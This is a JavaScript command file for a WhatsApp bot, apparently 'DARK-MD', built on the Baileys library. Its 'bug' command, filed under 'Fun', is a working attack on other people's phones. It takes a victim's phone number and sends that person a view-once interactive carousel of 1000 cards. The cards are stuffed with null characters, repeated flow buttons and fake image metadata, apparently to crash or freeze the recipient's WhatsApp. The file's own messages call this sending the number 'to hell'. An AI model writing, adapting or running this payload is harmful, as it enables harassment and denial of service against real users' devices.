const { zokou } = require("../framework/zokou");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

zokou(
  {
    nomCom: "bug",
    categorie: "Fun",
    reaction: "🎠",
  },
  async (dest, zk, commandeOptions) => {
    const { ms, repondre, arg } = commandeOptions;

    try {
      // Function to normalize phone numbers (remove spaces, ensure country code starts with +)
      const normalizePhoneNumber = (number) => {
        if (!number) return null;
        // Remove spaces and non-digit characters except +
        let normalized = number.replace(/[^+\d]/g, '');
        // If the number starts with a country code without +, add +
        if (normalized.match(/^\d/)) {
          normalized = '+' + normalized;
        }
        // Ensure the number starts with + and is followed by digits
        if (!normalized.match(/^\+\d{10,15}$/)) {
          return null; // Invalid number
        }
        return normalized;
      };

      // Extract the sender's number from the message metadata
      const senderJid = ms.key.participant || ms.key.remoteJid;
      if (!senderJid) {
        return repondre("𝗘𝗿𝗿𝗼𝗿: 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗶𝗱𝗲𝗻𝘁𝗶𝗳𝘆 𝘁𝗵𝗲 𝘀𝗲𝗻𝗱𝗲𝗿. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿. 😓");
      }

      // Normalize the sender's number
      const senderNumber = normalizePhoneNumber(senderJid.split('@')[0]);
      if (!senderNumber) {
        return repondre("𝗘𝗿𝗿𝗼𝗿: 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝘃𝗲𝗿𝗶𝗳𝘆 𝘆𝗼𝘂𝗿 𝗻𝘂𝗺𝗯𝗲𝗿. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿. 😓");
      }

      // Restrict the command to the owner (+254735342808)
      const ownerNumber = normalizePhoneNumber("+254107065646");
      if (senderNumber !== ownerNumber) {
        return repondre("𝗦𝗼𝗿𝗿𝘆, 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 (+254107065646)! 🚫");
      }

      // Check if a phone number was provided
      if (!arg[0]) {
        return repondre("𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗻𝘂𝗺𝗯𝗲𝗿 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗼 𝗵𝗲𝗹𝗹! 😈");
      }

      // Normalize the target phone number
      const phoneNumber = normalizePhoneNumber(arg[0]);
      if (!phoneNumber) {
        return repondre("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗜𝘁 𝗺𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 𝗮 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲 𝗹𝗶𝗸𝗲 +𝟮𝟱𝟰 𝗼𝗿 𝟮𝟱𝟰 𝗮𝗻𝗱 𝗯𝗲 𝟭𝟬-𝟭𝟱 𝗱𝗶𝗴𝗶𝘁𝘀 𝗹𝗼𝗻𝗴. 🤔");
      }

      // Verify if the target number is on WhatsApp
      const [result] = await zk.onWhatsApp(phoneNumber);
      if (!result.exists) {
        return repondre("𝗧𝗵𝗮𝘁 𝗻𝘂𝗺𝗯𝗲𝗿 𝗶𝘀𝗻’𝘁 𝗼𝗻 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮 𝗱𝗶𝗳𝗳𝗲𝗿𝗲𝗻𝘁 𝗻𝘂𝗺𝗯𝗲𝗿. 😓");
      }

      // The JID (WhatsApp ID) of the target number
      const targetJid = result.jid;

      // Notify the user that the carousel is being prepared
      repondre("𝗣𝗿𝗲𝗽𝗮𝗿𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝗳𝗼𝗿 " + phoneNumber + "… 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 🎠");

      // Prepare buttons for each card (same as original)
      let buttons = [];
      for (let i = 0; i < 5; i++) {
        buttons.push({
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            header: "null",
            body: "xxx",
            flow_action: "navigate",
            flow_action_payload: { screen: "FORM_SCREEN" },
            flow_cta: "Grattler",
            flow_id: "1169834181134583",
            flow_message_version: "3",
            flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s",
          }),
        });
      }

      // Prepare carousel cards (1000 cards as in original)
      let cards = [];
      for (let i = 0; i < 1000; i++) {
        cards.push({
          body: {
            text: `\u0000\u0000\u0000\u0000\u0000`,
          },
          footer: {
            text: "𝐃𝐀𝐑𝐊-𝐌𝐃 𝐛𝐲 𝐃𝐀𝐑𝐊 𝐓𝐄𝐂𝐇 𝐇𝐔𝐁",
          },
          header: {
            title: '🍀 𝗗𝗔𝗥𝗞-𝗠𝗗 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 \u0000\u0000\u0000\u0000',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
              fileLength: "591",
              height: 0,
              width: 0,
              mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
              fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
              directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1721344123",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
              scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
              scanLengths: [247, 201, 73, 63],
              midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=",
            },
          },
          nativeFlowMessage: {
            buttons: buttons,
          },
        });
      }

      // Create the carousel message using raw Baileys methods
      const carousel = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              body: {
                text: '\u0000\u0000\u0000\u0000',
              },
              footer: {
                text: "𝐃𝐀𝐑𝐊-𝐌𝐃 𝐛𝐲 𝐝𝐚𝐫𝐤_𝐭𝐞𝐜𝐡",
              },
              header: {
                hasMediaAttachment: false,
              },
              carouselMessage: {
                cards: cards,
              },
            },
          },
        },
      }, {});

      // Send the carousel message using raw Baileys relayMessage
      await zk.relayMessage(targetJid, carousel.message, { messageId: carousel.key.id });

      // Notify the user that the carousel was sent
      repondre("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗵𝗲𝗹𝗹! 🔥");

    } catch (error) {
      console.error("Error in .bug command:", error);
      repondre("𝗢𝗼𝗽𝘀, 𝘀𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝘄𝗲𝗻𝘁 𝘄𝗿𝗼𝗻𝗴 𝘄𝗵𝗶𝗹𝗲 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹: " + error.message);
    }
  }
);